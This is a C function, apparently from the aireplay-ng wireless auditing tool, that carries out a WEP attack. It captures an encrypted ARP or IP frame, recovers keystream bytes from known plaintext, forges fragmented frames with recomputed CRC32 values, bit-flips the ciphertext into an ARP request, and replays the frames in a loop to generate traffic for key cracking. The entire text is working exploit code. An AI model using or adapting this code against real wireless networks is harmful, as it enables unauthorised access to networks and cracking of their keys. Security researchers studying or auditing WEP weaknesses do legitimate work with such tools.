int do_attack_cfrag( void )
{
    int caplen, n;
    struct timeval tv;
    struct timeval tv2;
    float f, ticks[3];
    unsigned char bssid[6];
    unsigned char smac[6];
    unsigned char dmac[6];
    unsigned char keystream[128];
    unsigned char frag1[128], frag2[128], frag3[128];
    unsigned char clear[4096], final[4096], flip[4096];
    int isarp;
    int z, i;

    opt.f_fromds = 0;

read_packets:

    if( capture_ask_packet( &caplen, 0 ) != 0 )
        return( 1 );

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
        z+=2;

    if(caplen < z)
    {
        goto read_packets;
    }

    if(caplen > 3800)
    {
        goto read_packets;
    }

    switch( h80211[1] & 3 )
    {
        case  0:
            memcpy( bssid, h80211 + 16, 6 );
            memcpy( dmac, h80211 + 4, 6 );
            memcpy( smac, h80211 + 10, 6 );
            break;
        case  1:
            memcpy( bssid, h80211 + 4, 6 );
            memcpy( dmac, h80211 + 16, 6 );
            memcpy( smac, h80211 + 10, 6 );
            break;
        case  2:
            memcpy( bssid, h80211 + 10, 6 );
            memcpy( dmac, h80211 + 4, 6 );
            memcpy( smac, h80211 + 16, 6 );
            break;
        default:
            memcpy( bssid, h80211 + 10, 6 );
            memcpy( dmac, h80211 + 16, 6 );
            memcpy( smac, h80211 + 24, 6 );
            break;
    }

    memset(clear, 0, 4096);
    memset(final, 0, 4096);
    memset(flip, 0, 4096);
    memset(frag1, 0, 128);
    memset(frag2, 0, 128);
    memset(frag3, 0, 128);
    memset(keystream, 0, 128);

    /* check if it's a potential ARP request */

    //its length 68-24 or 86-24 and going to broadcast or a unicast mac (even first byte)
    if( (caplen-z == 68-24 || caplen-z == 86-24) && (memcmp(dmac, BROADCAST, 6) == 0 || (dmac[0]%2) == 0) )
    {
        /* process ARP */
        printf("Found ARP packet\n");
        isarp = 1;
        //build the new packet
        set_clear_arp(clear, smac, dmac);
        set_final_arp(final, opt.r_smac);

        for(i=0; i<14; i++)
            keystream[i] = (h80211+z+4)[i] ^ clear[i];

        // correct 80211 header
//         h80211[0] = 0x08;    //data
        if( (h80211[1] & 3) == 0x00 ) //ad-hoc
        {
            h80211[1] = 0x40;    //wep
            memcpy(h80211+4, smac, 6);
            memcpy(h80211+10, opt.r_smac, 6);
            memcpy(h80211+16, bssid, 6);
        }
        else //tods
        {
            if(opt.f_tods == 1)
            {
                h80211[1] = 0x41;    //wep+ToDS
                memcpy(h80211+4 , bssid, 6);
                memcpy(h80211+10, opt.r_smac, 6);
                memcpy(h80211+16, smac, 6);
            }
            else
            {
                h80211[1] = 0x42;    //wep+FromDS
                memcpy(h80211+4, smac, 6);
                memcpy(h80211+10, bssid, 6);
                memcpy(h80211+16, opt.r_smac, 6);
            }
        }
        h80211[22] = 0xD0; //frag = 0;
        h80211[23] = 0x50;

        //need to shift by 10 bytes; (add 1 frag in front)
        memcpy(frag1, h80211, z+4); //copy 80211 header and IV
        frag1[1] |= 0x04; //more frags
        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 8);
        frag1[z+4+8] = 0x00;
        frag1[z+4+9] = 0x01; //ethernet
        add_crc32(frag1+z+4, 10);
        for(i=0; i<14; i++)
            (frag1+z+4)[i] ^= keystream[i];
        /* frag1 finished */

        for(i=0; i<caplen; i++)
            flip[i] = clear[i] ^ final[i];

        add_crc32_plain(flip, caplen-z-4-4);

        for(i=0; i<caplen-z-4; i++)
            (h80211+z+4)[i] ^= flip[i];
        h80211[22] = 0xD1; // frag = 1;

        //ready to send frag1 / len=z+4+10+4 and h80211 / len = caplen
    }
    else
    {
        /* process IP */
        printf("Found IP packet\n");
        isarp = 0;
        //build the new packet
        set_clear_ip(clear, caplen-z-4-8-4); //caplen - ieee80211header - IVIDX - LLC/SNAP - ICV
        set_final_ip(final, opt.r_smac);

        for(i=0; i<8; i++)
            keystream[i] = (h80211+z+4)[i] ^ clear[i];

        // correct 80211 header
//         h80211[0] = 0x08;    //data
        if( (h80211[1] & 3) == 0x00 ) //ad-hoc
        {
            h80211[1] = 0x40;    //wep
            memcpy(h80211+4, smac, 6);
            memcpy(h80211+10, opt.r_smac, 6);
            memcpy(h80211+16, bssid, 6);
        }
        else
        {
            if(opt.f_tods == 1)
            {
                h80211[1] = 0x41;    //wep+ToDS
                memcpy(h80211+4 , bssid, 6);
                memcpy(h80211+10, opt.r_smac, 6);
                memcpy(h80211+16, smac, 6);
            }
            else
            {
                h80211[1] = 0x42;    //wep+FromDS
                memcpy(h80211+4, smac, 6);
                memcpy(h80211+10, bssid, 6);
                memcpy(h80211+16, opt.r_smac, 6);
            }
        }
        h80211[22] = 0xD0; //frag = 0;
        h80211[23] = 0x50;

        //need to shift by 12 bytes;(add 3 frags in front)
        memcpy(frag1, h80211, z+4); //copy 80211 header and IV
        memcpy(frag2, h80211, z+4); //copy 80211 header and IV
        memcpy(frag3, h80211, z+4); //copy 80211 header and IV
        frag1[1] |= 0x04; //more frags
        frag2[1] |= 0x04; //more frags
        frag3[1] |= 0x04; //more frags

        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 4);
        add_crc32(frag1+z+4, 4);
        for(i=0; i<8; i++)
            (frag1+z+4)[i] ^= keystream[i];

        memcpy(frag2+z+4, S_LLC_SNAP_ARP+4, 4);
        add_crc32(frag2+z+4, 4);
        for(i=0; i<8; i++)
            (frag2+z+4)[i] ^= keystream[i];
        frag2[22] = 0xD1; //frag = 1;

        frag3[z+4+0] = 0x00;
        frag3[z+4+1] = 0x01; //ether
        frag3[z+4+2] = 0x08; //IP
        frag3[z+4+3] = 0x00;
        add_crc32(frag3+z+4, 4);
        for(i=0; i<8; i++)
            (frag3+z+4)[i] ^= keystream[i];
        frag3[22] = 0xD2; //frag = 2;
        /* frag1,2,3 finished */

        for(i=0; i<caplen; i++)
            flip[i] = clear[i] ^ final[i];

        add_crc32_plain(flip, caplen-z-4-4);

        for(i=0; i<caplen-z-4; i++)
            (h80211+z+4)[i] ^= flip[i];
        h80211[22] = 0xD3; // frag = 3;

        //ready to send frag1,2,3 / len=z+4+4+4 and h80211 / len = caplen
    }


    /* loop resending the packet */

	/* Check if airodump-ng is running. If not, print that message */
    printf( "You should also start airodump-ng to capture replies.\n\n" );

    signal( SIGINT, sighandler );
    ctrl_c = 0;

    memset( ticks, 0, sizeof( ticks ) );

    nb_pkt_sent = 0;

    while( 1 )
    {
        if( ctrl_c )
            goto read_packets;

        /* wait for the next timer interrupt, or sleep */

        if( dev.fd_rtc >= 0 )
        {
            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
            {
                perror( "read(/dev/rtc) failed" );
                return( 1 );
            }

            ticks[0]++;
            ticks[1]++;
            ticks[2]++;
        }
        else
        {
            /* we can't trust usleep, since it depends on the HZ */

            gettimeofday( &tv,  NULL );
            usleep( 1000000/RTC_RESOLUTION );
            gettimeofday( &tv2, NULL );

            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )
                        + (float) ( tv2.tv_usec - tv.tv_usec );

            ticks[0] += f / ( 1000000/RTC_RESOLUTION );
            ticks[1] += f / ( 1000000/RTC_RESOLUTION );
            ticks[2] += f / ( 1000000/RTC_RESOLUTION );
        }

        /* update the status line */

        if( ticks[1] > (RTC_RESOLUTION/10) )
        {
            ticks[1] = 0;
            printf( "\rSent %ld packets...(%d pps)\33[K\r", nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)));
            fflush( stdout );
        }

        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION < 1 )
            continue;

        /* threshold reached */

        ticks[2] = 0;

        if( nb_pkt_sent == 0 )
            ticks[0] = 0;

        if(isarp)
        {
            if( send_packet( frag1, z+4+10+4 ) < 0 )
                return( 1 );
            nb_pkt_sent--;
        }
        else
        {
            if( send_packet( frag1, z+4+4+4 ) < 0 )
                return( 1 );
            if( send_packet( frag2, z+4+4+4 ) < 0 )
                return( 1 );
            if( send_packet( frag3, z+4+4+4 ) < 0 )
                return( 1 );
            nb_pkt_sent-=3;
        }
        if( send_packet( h80211, caplen ) < 0 )
            return( 1 );
    }

    return( 0 );
}